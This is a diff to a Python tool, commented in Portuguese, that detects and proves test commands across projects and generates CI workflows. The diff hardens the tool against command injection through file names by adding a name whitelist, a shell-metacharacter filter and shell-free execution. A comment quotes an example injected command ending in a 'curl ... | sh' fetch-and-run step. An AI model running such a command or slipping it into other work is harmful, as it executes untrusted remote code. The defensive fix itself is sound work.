@@ -47,12 +47,22 @@ import sys
 try:
     sys.stdout.reconfigure(encoding="utf-8", errors="replace")
     sys.stderr.reconfigure(encoding="utf-8", errors="replace")
-except Exception:
+except Exception:  # noqa: BLE001,S110 - sem stdout nao ha para onde avisar
     pass
 
 AQUI = os.path.dirname(os.path.abspath(__file__))
 sys.path.insert(0, AQUI)
-import o_basico as ob                                       # noqa: E402
+import o_basico as ob  # noqa: E402
+
+
+def erro(msg):
+    """Diagnostico vai para stderr; stdout fica so com resultado.
+
+    Quem chama esta peca num `|` ou num `>` precisa poder separar as duas
+    coisas. Misturadas, quem consome tem de adivinhar qual linha e resultado e
+    qual e reclamacao.
+    """
+    sys.stderr.write(msg + chr(10))
 
 
 def ler(p):
@@ -60,6 +70,43 @@ def ler(p):
         return io.open(p, encoding="utf-8", errors="replace").read()
     except Exception:                                       # noqa: BLE001
         return ""
+
+
+# 🔴 O NOME DO ARQUIVO VEM DO DISCO DE OUTRA PESSOA, e ja foi
+# interpolado direto num comando que rodava com `shell=True`. Um arquivo
+# chamado
+#
+#     testar_x.py && <um comando qualquer>
+#
+# virava, depois do `" && ".join(...)`:
+#
+#     python -B ok.py && python -B testar_x.py && curl ...s.sh | sh
+#
+# e esta peca varre 30 projetos. Pior: o mesmo texto ia para o `run:` do
+# workflow gerado, entao a injecao viajaria para o CI do projeto alvo.
+#
+# 🔑 A ironia que fecha o caso: a `seguranca_na_porta` desta mesma casa tem a
+# familia `execucao-perigosa`, e ela ACUSA a linha do `shell=True` — conferido
+# rodando o detector contra ela. O gate nao pegou porque so olha codigo NOVO
+# sendo escrito, e esta peca e mais velha que o gate. **Gate que so olha o
+# futuro nao audita o passado.**
+#
+# A defesa tem duas camadas, e as duas sao necessarias:
+#   1. AQUI: nome que nao casa `NOME_SEGURO` nao entra na receita, e o fato e
+#      dito em voz alta — silenciar seria esconder um arquivo do CI;
+#   2. no `provar()`: a execucao passa a ser por LISTA DE ARGUMENTOS, sem
+#      shell. Sem metacaractere interpretado, nao ha o que injetar.
+#
+# Uma camada so bastaria para o caso conhecido. Duas bastam para o caso que
+# ainda nao vi: se um dia o filtro deixar passar algo, a execucao sem shell
+# continua tratando o nome como nome.
+NOME_SEGURO = re.compile(r"^[\w./\\-]+$")
+
+
+def _seguros(relativos):
+    """(aceitos, recusados) — nome de arquivo que pode virar comando."""
+    ok = [t for t in relativos if NOME_SEGURO.match(t)]
+    return ok, [t for t in relativos if not NOME_SEGURO.match(t)]
 
 
 def receita(base):
@@ -82,7 +129,8 @@ def receita(base):
         try:
             script_test = ((json.loads(ler(pkg) or "{}").get("scripts")
                             or {}).get("test") or "")
-        except Exception:                                   # noqa: BLE001
+        except Exception:  # noqa: BLE001,S110 - json alheio quebrado
+            # nao e problema nosso: seguimos para as outras formas de teste
             pass
 
     proprios = sorted(t for t in py
@@ -105,14 +153,24 @@ def receita(base):
     if proprios:
         proprios = [t for t in proprios
                     if not any(t.startswith(w + "/") for w in wts)]
+        proprios, recusados = _seguros(proprios)
+        # Dito em voz alta, nunca engolido: um arquivo fora do CI por causa do
+        # NOME e um teste que deixa de rodar, e teste que some calado e pior
+        # que teste que falha.
+        for t in recusados:
+            print("       ⚠ FORA do CI: `%s` tem caractere que virava comando"
+                  % t[:70])
         if proprios:
             return ("script proprio da casa (%d)" % len(proprios),
                     " && ".join("python -B %s" % t for t in proprios),
                     "python")
     if usa_pytest:
-        ignora = "".join(" --ignore=%s" % w for w in wts)
-        return ("pytest" + (" (worktree fora: %s)" % ", ".join(wts)
-                            if wts else ""),
+        wts_ok, wts_ruins = _seguros(wts)
+        for w in wts_ruins:
+            print("       ⚠ worktree `%s` NAO entra no --ignore (nome)" % w[:60])
+        ignora = "".join(" --ignore=%s" % w for w in wts_ok)
+        return ("pytest" + (" (worktree fora: %s)" % ", ".join(wts_ok)
+                            if wts_ok else ""),
                 "python -m pytest -q" + ignora, "python")
     if script_test and "test" in script_test.lower():
         return ("npm test", "npm test", "node")
@@ -121,14 +179,52 @@ def receita(base):
     return (None, None, None)
 
 
+def argumentos(cmd):
+    """O comando como LISTA de listas de argumentos, para rodar sem shell.
+
+    O `cmd` e uma string porque e ela que vai para o `run:` do workflow — la
+    o shell e do GitHub e nao ha como fugir dele. Aqui a mesma string vira
+    argumentos separados, e cada `&&` vira um passo da sequencia.
+
+    Devolve [] quando a string tem metacaractere que so o shell entende. Isso
+    NAO e conservadorismo: se a peca nao consegue reproduzir o comando sem
+    shell, ela nao pode provar que ele funciona — e ela so escreve o CI do que
+    provou.
+    """
+    if re.search(r"[|;><`$(){}\[\]*?~\n]", cmd):
+        return []
+    return [p.split() for p in cmd.split("&&") if p.strip()]
+
+
 def provar(base, cmd):
-    """Roda o comando NO REPO. Devolve (ok, codigo, ultimas linhas)."""
+    """Roda o comando NO REPO, SEM shell. Devolve (ok, codigo, ultimas linhas).
+
+    🔴 Rodava com `shell=True`, e o `cmd` carrega nome de arquivo
+    lido do disco de outra pessoa. Agora cada passo vai como LISTA DE
+    ARGUMENTOS: o sistema operacional trata cada item como um argumento, e
+    `&&`, `|` ou `;` dentro de um nome deixam de ser operadores para virar o
+    que sempre foram — caracteres de um nome de arquivo.
+
+    Quando a string tem metacaractere que so o shell entende, a peca RECUSA em
+    vez de cair para o shell. Cair de volta seria manter a porta aberta com um
+    nome mais bonito.
+    """
+    passos = argumentos(cmd)
+    if not passos:
+        return (False, -1,
+                ["comando exige shell (metacaractere) — NAO provado, e sem "
+                 "prova este CI nao e escrito"])
     try:
-        r = subprocess.run(cmd, cwd=base, shell=True, capture_output=True,
-                           timeout=600)
-        saida = (r.stdout + r.stderr).decode("utf-8", "replace")
-        linhas = [l.strip() for l in saida.rstrip().split("\n") if l.strip()]
-        return (r.returncode == 0, r.returncode, linhas[-4:])
+        ultimas = []
+        for argv in passos:
+            r = subprocess.run(argv, cwd=base, capture_output=True,
+                               timeout=600)
+            saida = (r.stdout + r.stderr).decode("utf-8", "replace")
+            ultimas = [l_.strip() for l_ in saida.rstrip().split("\n")
+                       if l_.strip()]
+            if r.returncode != 0:
+                return (False, r.returncode, ultimas[-4:])
+        return (True, 0, ultimas[-4:])
     except Exception as e:                                  # noqa: BLE001
         return (False, -1, ["%s: %s" % (type(e).__name__, e)])
 
@@ -173,7 +269,7 @@ jobs:
 def um(nome, escrever=False):
     base = os.path.join(ob.RAIZ, nome.replace("/", os.sep))
     if not os.path.isdir(base):
-        print("  %s: nao existe" % nome)
+        erro("  %s: nao existe" % nome)
         return False
     r_nome, cmd, amb = receita(base)
     if not cmd:
@@ -185,8 +281,8 @@ def um(nome, escrever=False):
     ok, cod, ult = provar(base, cmd)
     print("  %-26s   PROVA LOCAL: %s (exit %d)"
           % ("", "PASSOU" if ok else "FALHOU", cod))
-    for l in ult:
-        print("  %-26s     %s" % ("", l[:84]))
+    for l_ in ult:
+        print("  %-26s     %s" % ("", l_[:84]))
     if not ok:
         print("  %-26s   -> NAO escrevo workflow de comando que nao passa."
               % "")
